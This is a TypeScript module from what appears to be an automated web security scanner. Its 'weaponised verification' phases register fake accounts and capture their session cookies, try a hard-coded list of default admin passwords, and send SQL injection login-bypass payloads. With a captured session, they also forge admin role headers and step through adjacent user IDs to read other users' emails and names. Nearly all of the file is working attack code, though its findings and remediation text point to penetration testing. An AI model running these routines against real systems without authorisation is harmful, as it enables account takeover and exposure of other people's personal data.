/**
 * Weaponised verification phases — Phase 24 (open registration),
 * Phase 25 (default credentials), Phase 26 (SQLi auth bypass),
 * Phase 28 (IDOR with captured session).
 *
 * These phases only run when policy.allowVerification is true and
 * active probes are permitted (no WAF challenge detected).
 */

import {
  activeProbesAllowed,
  ts,
  getCapturedSession,
  storeCapturedSession,
} from '../../context';
import { probe } from '../../utils/http';
import type { RealFinding, Target, LogFn } from '../../context';

// ─── Helpers ─────────────────────────────────────────────────────────────────

function extractSessionCookie(setCookieHeader: string): string | null {
  const m = setCookieHeader.match(
    /(?:^|,)\s*((?:PHPSESSID|JSESSIONID|session|sess|sid|auth|token|user_session|_session|access_token)[^;,]*)/i,
  );
  return m ? m[1]!.trim() : null;
}

function hasAuthenticatedContent(body: string, finalUrl: string): boolean {
  const b = body.toLowerCase();
  return (
    [
      'log out',
      'logout',
      'sign out',
      'signout',
      'dashboard',
      'my account',
      'my profile',
      'welcome',
      'account settings',
    ].some((s) => b.includes(s)) ||
    ['dashboard', 'account', 'profile', 'home', 'welcome'].some((s) =>
      finalUrl.toLowerCase().includes(s),
    )
  );
}

function buildRegistrationBody(
  hiddenInputs: Record<string, string>,
  csrfToken: string | null,
  fakeData: Record<string, string>,
): string {
  const fields: Record<string, string> = {
    ...hiddenInputs,
    email: fakeData.email!,
    username: fakeData.username!,
    user: fakeData.username!,
    password: fakeData.password!,
    password_confirmation: fakeData.password!,
    confirm_password: fakeData.password!,
    password2: fakeData.password!,
    first_name: fakeData.firstName!,
    last_name: fakeData.lastName!,
    firstname: fakeData.firstName!,
    lastname: fakeData.lastName!,
    name: fakeData.name!,
    company: fakeData.company!,
    phone: fakeData.phone!,
    address: fakeData.address!,
    city: fakeData.city!,
    zip: fakeData.zip!,
    country: fakeData.country!,
  };
  if (csrfToken) {
    fields['_token'] = csrfToken;
    fields['csrf_token'] = csrfToken;
    fields['authenticity_token'] = csrfToken;
  }
  return Object.entries(fields)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join('&');
}

// ─── Phase 24: Open Registration ─────────────────────────────────────────────

export async function checkOpenRegistration(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 24] Testing open registration...`);
  const regPaths = [
    '/register',
    '/signup',
    '/sign-up',
    '/account/register',
    '/user/register',
    '/users/register',
    '/create-account',
  ];
  const rand = Math.random().toString(36).slice(2, 8);
  const fakeData: Record<string, string> = {
    email: `sentinelx${rand}@test.com`,
    username: `sentinel${rand}`,
    password: `SentX${rand}!@#`,
    firstName: 'Sentinel',
    lastName: 'XTest',
    name: `Sentinel ${rand}`,
    company: `TestCorp${rand}`,
    phone: `+1555${Math.floor(1_000_000 + Math.random() * 9_000_000)}`,
    address: '123 Test Street',
    city: 'Testville',
    zip: '10001',
    country: 'US',
  };

  for (const regPath of regPaths.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const regUrl = target.url.replace(/\/$/, '') + regPath;
    const pageRes = await probe(regUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404 || pageRes.status === 410) continue;
    const hasForm = /<form[^>]*>/i.test(pageRes.body);
    const hasPasswordField = /type=['"]?password['"]?/i.test(pageRes.body);
    const hasEmailField = /type=['"]?email['"]?|name=['"]?email['"]?/i.test(pageRes.body);
    if (!hasForm || (!hasPasswordField && !hasEmailField)) continue;

    await onLog(
      `[${ts()}] [Phase 24] Registration form at ${regUrl} — submitting fake identity...`,
    );
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /input[^>]+type=['"]?hidden['"]?[^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(pageRes.body)) !== null) {
      const nm = hm[0].match(/name=['"]([^'"]+)['"]/i);
      const vm = hm[0].match(/value=['"]([^'"]*)['"]/i);
      if (nm && vm) hiddenInputs[nm[1]!] = vm[1]!;
    }
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    const submitRes = await probe(regUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Referer: regUrl,
        ...(cookieHeader ? { Cookie: cookieHeader } : {}),
      },
      body: buildRegistrationBody(hiddenInputs, csrfToken, fakeData),
      timeoutMs: 12_000,
      followRedirects: true,
    });
    if (!submitRes) continue;

    const sessionCookie = extractSessionCookie(submitRes.headers['set-cookie'] ?? '');
    const authenticated = hasAuthenticatedContent(submitRes.body, submitRes.finalUrl);
    if (sessionCookie && authenticated) {
      const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
      storeCapturedSession(sessionCookie);
      findings.push({
        title: 'Unauthorized Account Creation via Open Registration — Full Dashboard Access',
        severity: 'critical',
        verification: 'verified',
        confidence: 90,
        cvss: 8.5,
        cve: null,
        description: `An account was automatically created at ${regUrl} without verification.`,
        evidence: `REGISTRATION URL: ${regUrl}\nEMAIL USED: ${fakeData.email}\nHTTP RESPONSE: ${submitRes.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${['log out', 'logout', 'dashboard', 'account', 'welcome'].filter((s) => submitRes.body.toLowerCase().includes(s)).join(', ') || 'redirect to authenticated URL'}`,
        remediation: 'Require email verification, CAPTCHA, or manual approval.',
      });
      await onLog(
        `[${ts()}] ⚠ CRITICAL: Open registration at ${regUrl} — session captured (${masked})`,
      );
      return findings;
    }
    const bodyLower = submitRes.body.toLowerCase();
    if (
      bodyLower.includes('captcha') ||
      bodyLower.includes('verify your email') ||
      bodyLower.includes('confirmation email')
    ) {
      findings.push({
        title: 'Registration Form Present but Protected',
        severity: 'low',
        verification: 'informational',
        confidence: 30,
        cvss: 0,
        cve: null,
        description: `Registration form at ${regUrl} is gated by CAPTCHA/email verification.`,
        evidence: `POST ${regUrl} → HTTP ${submitRes.status}`,
        remediation: 'Ensure server-side enforcement.',
      });
      await onLog(`[${ts()}] [Phase 24] Registration form at ${regUrl} is gated`);
      return findings;
    }
  }
  await onLog(`[${ts()}] [Phase 24] No open registration endpoint found`);
  return findings;
}

// ─── Phase 25: Default Credentials ───────────────────────────────────────────

const DEFAULT_CREDENTIALS: [string, string][] = [
  ['admin', 'admin'],
  ['admin', 'password'],
  ['admin', 'admin123'],
  ['admin', '1234'],
  ['admin', '123456'],
  ['admin', 'password123'],
  ['admin', 'admin@123'],
  ['admin', 'Admin1234!'],
  ['administrator', 'admin'],
  ['administrator', 'password'],
  ['root', 'root'],
  ['root', 'toor'],
  ['root', 'password'],
  ['user', 'user'],
  ['user', 'password'],
  ['test', 'test'],
  ['guest', 'guest'],
  ['demo', 'demo'],
  ['support', 'support'],
  ['manager', 'manager'],
];

export async function checkDefaultCredentials(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 25] Testing default credentials...`);
  const loginPaths = [
    '/rest/Session/login',
    '/login',
    '/signin',
    '/sign-in',
    '/admin/login',
    '/admin',
    '/user/login',
    '/auth/login',
    '/api/login',
    '/api/auth',
  ];
  const FAIL_SIGNALS = [
    'invalid',
    'incorrect',
    'error',
    'failed',
    'wrong',
    'denied',
    'unauthorized',
  ];

  for (const loginPath of loginPaths.slice(0, 5)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, '') + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;
    const hasLoginForm =
      /<form[^>]*>/i.test(pageRes.body) && /type=['"]?password['"]?/i.test(pageRes.body);
    if (!hasLoginForm) continue;

    await onLog(
      `[${ts()}] [Phase 25] Login form at ${loginUrl} — testing ${DEFAULT_CREDENTIALS.length} pairs...`,
    );
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    let attempts = 0;
    for (const [username, password] of DEFAULT_CREDENTIALS) {
      if (!activeProbesAllowed() || attempts >= 20) break;
      attempts++;
      const fields: Record<string, string> = {
        username,
        user: username,
        email: username,
        login: username,
        password,
        pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');

      const r = await probe(loginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: loginUrl,
          ...(cookieHeader ? { Cookie: cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers['set-cookie'] ?? '');
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasLoginForm2 =
        /<form[^>]*>/i.test(r.body) && /type=['"]?password['"]?/i.test(r.body);
      const hasAuth = ['log out', 'logout', 'dashboard', 'account', 'welcome', 'profile'].some(
        (s) => bodyLower.includes(s),
      );

      if (sessionCookie && !hasFail && !hasLoginForm2 && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: `Default Credentials — ${username}:${password} Grants Full Access`,
          severity: 'critical',
          verification: 'verified',
          confidence: 95,
          cvss: 9.8,
          cve: null,
          description: `The login endpoint at ${loginUrl} accepted default credentials (${username}:${password}).`,
          evidence: `LOGIN URL: ${loginUrl}\nCREDENTIALS: ${username}:${password}\nHTTP RESPONSE: ${r.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${['log out', 'logout', 'dashboard', 'account', 'welcome'].filter((s) => bodyLower.includes(s)).join(', ') || 'HTTP redirect'}`,
          remediation: 'Change all default credentials immediately.',
        });
        await onLog(
          `[${ts()}] ⚠ CRITICAL: Default credentials CONFIRMED — ${username}:${password} at ${loginUrl} (${masked})`,
        );
        return findings;
      }
    }
    await onLog(`[${ts()}] [Phase 25] No default credentials accepted at ${loginUrl}`);
    break;
  }
  return findings;
}

// ─── Phase 26: SQLi Auth Bypass ───────────────────────────────────────────────

const SQLI_AUTH_PAYLOADS: { username: string; password: string; note: string }[] = [
  { username: "' OR '1'='1", password: 'anything', note: 'classic OR bypass' },
  { username: "' OR '1'='1' --", password: 'anything', note: 'OR bypass with comment' },
  { username: "admin'--", password: 'anything', note: 'admin comment bypass' },
  { username: "admin'/*", password: 'anything', note: 'admin block-comment' },
  { username: "' OR 1=1--", password: 'anything', note: 'numeric OR bypass' },
  { username: "') OR ('1'='1", password: 'anything', note: 'parenthesis bypass' },
  { username: "admin' #", password: 'anything', note: 'MySQL hash bypass' },
  { username: "' OR 'x'='x", password: "' OR 'x'='x", note: 'full double-bypass' },
];

export async function checkSqliAuthBypass(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 26] Testing SQL injection authentication bypass...`);
  const loginPaths = [
    '/rest/Session/login',
    '/login',
    '/signin',
    '/sign-in',
    '/admin/login',
    '/admin',
    '/user/login',
  ];
  const AUTH_SIGNALS = [
    'log out',
    'logout',
    'dashboard',
    'welcome',
    'account',
    'admin panel',
    'control panel',
  ];
  const FAIL_SIGNALS = ['invalid', 'incorrect', 'error', 'failed', 'wrong'];

  for (const loginPath of loginPaths.slice(0, 4)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, '') + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;
    const hasLoginForm =
      /<form[^>]*>/i.test(pageRes.body) && /type=['"]?password['"]?/i.test(pageRes.body);
    if (!hasLoginForm) continue;

    await onLog(`[${ts()}] [Phase 26] Testing SQLi bypass payloads at ${loginUrl}...`);
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    for (const { username, password, note } of SQLI_AUTH_PAYLOADS) {
      if (!activeProbesAllowed()) break;
      const fields: Record<string, string> = {
        username,
        user: username,
        email: username,
        login: username,
        password,
        pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');

      const r = await probe(loginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: loginUrl,
          ...(cookieHeader ? { Cookie: cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers['set-cookie'] ?? '');
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasAuth = AUTH_SIGNALS.some((s) => bodyLower.includes(s));

      if (sessionCookie && !hasFail && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: 'SQL Injection Authentication Bypass — Login as Administrator',
          severity: 'critical',
          verification: 'verified',
          confidence: 92,
          cvss: 9.8,
          cve: null,
          description: `SQLi payload '${username}' (${note}) bypassed login at ${loginUrl}.`,
          evidence: `LOGIN URL: ${loginUrl}\nSQLi PAYLOAD: ${username}\nHTTP RESPONSE: ${r.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${AUTH_SIGNALS.filter((s) => bodyLower.includes(s)).join(', ') || 'HTTP redirect'}`,
          remediation: 'Use parameterised queries.',
        });
        await onLog(`[${ts()}] ⚠ CRITICAL: SQLi auth bypass CONFIRMED at ${loginUrl}`);
        return findings;
      }
    }
    break;
  }
  await onLog(`[${ts()}] [Phase 26] No SQL injection auth bypass confirmed`);
  return findings;
}

// ─── Phase 28: IDOR with Captured Session ────────────────────────────────────

export async function checkIdorWithCapturedSession(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const capturedSession = getCapturedSession();
  if (!capturedSession || !activeProbesAllowed()) return findings;

  await onLog(`[${ts()}] [Phase 28] Testing IDOR / privilege escalation using captured session...`);
  const cookieHeader = capturedSession;
  const ADMIN_PATHS = [
    '/admin',
    '/admin/dashboard',
    '/admin/users',
    '/api/admin',
    '/api/admin/users',
  ];
  const AUTH_PATHS = [
    '/profile',
    '/settings',
    '/account',
    '/dashboard',
    '/user',
    '/me',
    '/api/user',
    '/api/profile',
    '/api/me',
    '/api/account',
  ];

  // Role escalation via headers
  for (const adminPath of ADMIN_PATHS.slice(0, 3)) {
    if (!activeProbesAllowed()) break;
    const adminUrl = target.url.replace(/\/$/, '') + adminPath;
    const [normalRes, escalatedRes] = await Promise.all([
      probe(adminUrl, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 }),
      probe(adminUrl, {
        headers: {
          Cookie: cookieHeader,
          'X-Admin': 'true',
          Role: 'admin',
          'X-User-Role': 'admin',
          'X-Forwarded-User': 'admin',
        },
        timeoutMs: 8_000,
      }),
    ]);
    if (
      normalRes &&
      escalatedRes &&
      (normalRes.status === 403 || normalRes.status === 401) &&
      escalatedRes.status === 200 &&
      escalatedRes.body.length > 200
    ) {
      findings.push({
        title: 'Privilege Escalation via Admin Headers — Unauthorized Admin Access',
        severity: 'critical',
        verification: 'suspected',
        confidence: 72,
        cvss: 9.1,
        cve: null,
        description: `Admin endpoint ${adminUrl} accessible with role headers.`,
        evidence: `NORMAL: HTTP ${normalRes.status}\nESCALATED: HTTP ${escalatedRes.status}`,
        remediation: 'Never trust client-supplied role headers.',
      });
      await onLog(`[${ts()}] ⚠ CRITICAL: Privilege escalation via admin headers at ${adminUrl}`);
      return findings;
    }
  }

  // IDOR: cross-user data access
  for (const authPath of AUTH_PATHS.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const authUrl = target.url.replace(/\/$/, '') + authPath;
    const r = await probe(authUrl, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 });
    if (!r || r.status === 404 || r.status === 401 || r.status === 403) continue;

    const numericIds = [
      ...r.body.matchAll(/"(?:id|user_id|userId|account_id|accountId|order_id|orderId)":\s*(\d+)/g),
    ].map((m) => parseInt(m[1]!));
    if (numericIds.length === 0) continue;
    const myId = numericIds[0]!;
    const myEmail = r.body.match(/"email":\s*"([^"]+)"/)?.[1];
    const myName = r.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];

    for (const testId of [myId - 1, myId + 1]) {
      const testUrls = [
        `${target.url}api/user/${testId}`,
        `${authUrl}/${testId}`,
        `${authUrl}?id=${testId}`,
      ];
      for (const url of testUrls) {
        const idRes = await probe(url, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 });
        if (!idRes || idRes.status === 404 || idRes.status === 403) continue;
        const testEmail = idRes.body.match(/"email":\s*"([^"]+)"/)?.[1];
        const testName = idRes.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];
        if (
          (myEmail && testEmail && myEmail !== testEmail) ||
          (myName && testName && myName !== testName)
        ) {
          findings.push({
            title: 'IDOR — Cross-User Data Access via Direct Object Reference',
            severity: 'high',
            verification: 'verified',
            confidence: 90,
            cvss: 8.1,
            cve: null,
            description: `Accessing object ID ${testId} returned data for a different user.`,
            evidence: `MY ID: ${myId} → email=${myEmail}\nACCESSED ID: ${testId} → email=${testEmail}`,
            remediation: 'Verify object ownership on every data access.',
          });
          await onLog(`[${ts()}] ⚠ HIGH: IDOR confirmed — accessed user ${testId} data`);
          return findings;
        }
      }
    }
  }
  await onLog(`[${ts()}] [Phase 28] No cross-user data access confirmed`);
  return findings;
}
